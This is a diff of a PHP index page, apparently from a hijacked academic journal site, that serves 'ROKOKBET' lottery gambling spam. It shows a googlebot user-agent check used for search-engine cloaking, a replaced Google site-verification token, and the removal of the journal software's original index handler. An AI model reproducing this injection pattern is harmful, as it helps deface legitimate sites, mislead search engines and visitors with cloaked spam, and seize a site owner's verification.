@@ -10,7 +10,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
     <!-- SEO Meta Tags-->
     <meta name="description" content="ROKOKBET bekerja sama dengan Jurnal Inovasi Pendidikan - Edukhasi Publishing ke-69 guna menyajikan studi komparatif statistika Toto Togel 4D menggunakan parameter efisiensi ekonomi berbasis kebijakan bet termurah tahun ini.">
     <meta name="keywords" content="rokokbet, togel 4d, 4d, togel online, togel 100, togel resmi, agen togel, toto togel, rokokbet situs, situs rokokbet, login rokokbet, rokokbet login, link rokokbet, rokokbet link, daftar rokokbet, rokokbet daftar">
-    <meta name="google-site-verification" content="N_P4MfJPLri-rM4ipDt-hq3HBSQkW1hEXIXc2ku07Ag" />
+    <meta name="google-site-verification" content="Wel4ejbuxeWuoGSThNRDJiefs5el1SqiH-U8Kz1PAgs" />
     <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjvFSxUJCKYdTZI3tfrdTBPQAJJC9A3cQkInJ_DNz2a3Aq91z-1_I9xAd4DNPaf_ee83C_oUEMt6k4opWcPnGInPkN7hq8ZACF1c9tcNq_qoIsLI5q7hIwvvjTbmwHSf9L6uGIYX3KWmWpLsut1lK2bEa4jgCzNEpgkMn987coTyIgZrDR8MWw3lNAm1Us/s1254/6bd7254f-fe9c-47f0-9573-7c68136b0ee0.png">
     <link rel="alternate" type="application/rss+xml" title="Rss Service Feed" href="https://www.seoclerk.com/rss">
     <link rel="canonical" href="https://edukhasi.org/">
@@ -10807,27 +10807,3 @@ function carousel_next() {
 exit;
 }
 ?>
-<?php
-
-/**
- * @defgroup pages_index Index Pages
- */
- 
-/**
- * @file pages/index/index.php
- *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @ingroup pages_index
- * @brief Handle site index requests. 
- *
- */
-
-switch ($op) {
-	case 'index':
-		define('HANDLER_CLASS', 'IndexHandler');
-		import('pages.index.IndexHandler');
-		break;
-}
